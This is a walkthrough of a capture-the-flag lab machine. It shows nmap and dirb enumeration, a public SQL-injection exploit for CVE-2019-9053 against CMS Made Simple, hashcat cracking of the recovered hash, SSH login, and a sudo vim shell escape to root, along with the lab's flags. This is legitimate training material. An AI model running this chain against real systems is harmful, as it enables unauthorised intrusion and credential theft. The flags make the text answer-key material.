**1. How many services are running under port 1000?**

Let's start with enumerationg the machine using NMAP and save the result to txt file:
`nmap -sS -sV -A <IP> -oN nmap.txt`
```
snip ...
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.6.36.242
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
snip ...
```
We can see there are three open ports and two of them are under 1000. 


**2. What is running on the higher port?**

`ssh is running on port 2222`

**3.What's the CVE you're using against the application?**

Now, we need to enumerate a little bit to find out our CVE to use. Our NMAP showing us that there is an apache server is running on port 80, let's go and open it using our IP. 
![apache](https://user-images.githubusercontent.com/101599690/215180783-3b774595-dcc9-4904-bfb6-42e225ebe59a.png)

There is nothing really intersting here, it just a defaul apache server webpage. Let's try find if there are any hidden directories using dirb. 
`dirb http://IP /usr/share/dirb/wordlists/common.txt`

We found there is a directory called `simple`, let's look at it. Go to `http://IP/simple/`.

Looking around, we found the website is `CMS made simple`. 

![CMS](https://user-images.githubusercontent.com/101599690/215182559-ae148fb7-2604-49d2-962d-49ef80e011f6.png)

**Now we need to know the version of the website, to know exactly which CVE we are going to use. The website shows us the version at the bottom of the webpage, which is `2.2.8`.**

![simple](https://user-images.githubusercontent.com/101599690/215182740-d12c48ae-bea3-4014-a111-b0d3534f3025.png)

**Using searchploit to find out the vulnerability of this webpage version.** 

`searchploit CMS made simple 2.2.8`

![Screenshot 2023-01-27 150318](https://user-images.githubusercontent.com/101599690/215186517-fed48b5f-cf27-4a08-bfa9-312955df29b8.png)

Now we know the vunlerability we are going to use, and searching in `cve.mitre.org` we know the CVE-ID is `CVE-2019-9053`. 

**3. What's the CVE you're using against the application?**

`CVE-2019-9053`

**4. To what kind of vulnerability is the application vulnerable?**

`SQLI`

**5. What's the password?**

Searching about this CVE, I found there is a script to get the username and hash password. I get the script from `https://github.com/e-renna/CVE-2019-9053`.

Let's use the script on the simple webpage. `python3 exploit.py -u http://IP/simple/`.

![ssss](https://user-images.githubusercontent.com/101599690/215186636-8ea7ad0d-3e86-44cb-9d14-46958e466b3f.png)


The script gives us the a salt password and hash password. We can crack the paswword using the hash and salt using hashcat. Storing the `hash:salt` using this foramt to a text file and cun `hashcat -a 0 -m 20 password.txt password.txt /usr/share/wordlists/rockyou.txt`. We specify the hash is of type md5 `-a 0` and choosing the format `20 = md5($salt.$pass)` by `-m 20`. 

![hashcat](https://user-images.githubusercontent.com/101599690/215195389-921d8ac1-4865-43a4-bca1-73e55507343b.png)


I found the password is `secret`. Now, we have the username and password. We can try to login using ssh service `ssh mitch@IP -p2222`. 

![ssh](https://user-images.githubusercontent.com/101599690/215196554-1dd9c106-23d4-423a-8c7c-922f413fbb3d.png)

**6. Where can you login with the details obtained?**

`ssh`

**7. What's the user flag?**

`G00d j0b, keep up!`

**8. Is there any other user in the home directory? What's its name?**

We can enumerate the machine and go to `/home` to see and get the other username which is `sunbath`.

**9. What can you leverage to spawn a privileged shell?**

To see our privilege we can do `sudo -l` and find that we have `vim` 

![sudo -l](https://user-images.githubusercontent.com/101599690/215198408-0bfed614-095f-4abe-bfc0-ce34f919191c.png)

To see what we can do with `vim` command, `https://gtfobins.github.io/` is a good source. 

![vim](https://user-images.githubusercontent.com/101599690/215199003-79303d82-0ab9-410a-96f9-42778a760d5c.png)

so we can run a shell using `sudo vim -c ':!/bin/sh'` and escalate our privileges. 

![root](https://user-images.githubusercontent.com/101599690/215199506-95136a6a-76d1-469c-8232-baf08e1265e8.png)

Lets do `ls /root` and then read the flag of the user `cat /root/root.txt` and get the flag `W3ll d0n3. You made it!`
